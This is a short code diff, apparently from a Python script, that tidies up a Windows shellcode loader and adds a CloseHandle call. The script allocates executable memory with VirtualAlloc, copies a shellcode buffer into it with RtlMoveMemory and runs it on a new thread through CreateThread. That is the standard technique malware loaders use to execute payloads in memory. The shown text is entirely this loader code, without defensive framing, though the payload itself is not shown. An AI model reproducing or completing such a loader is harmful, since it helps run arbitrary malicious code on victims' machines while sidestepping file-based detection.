@@ -93,7 +93,9 @@ shellcode_pointer = kernel32.VirtualAlloc(
     0x40,
 )
 shellcode_buffer = (c_char * shellcode_length).from_buffer(shellcode)
-kernel32.RtlMoveMemory(c_void_p(shellcode_pointer), shellcode_buffer, shellcode_length)
+kernel32.RtlMoveMemory(
+    c_void_p(shellcode_pointer), shellcode_buffer, shellcode_length
+)
 thread_handle = kernel32.CreateThread(
     None,
     0,
@@ -103,3 +105,4 @@ thread_handle = kernel32.CreateThread(
     None,
 )
 kernel32.WaitForSingleObject(thread_handle, -1)
+kernel32.CloseHandle(thread_handle)
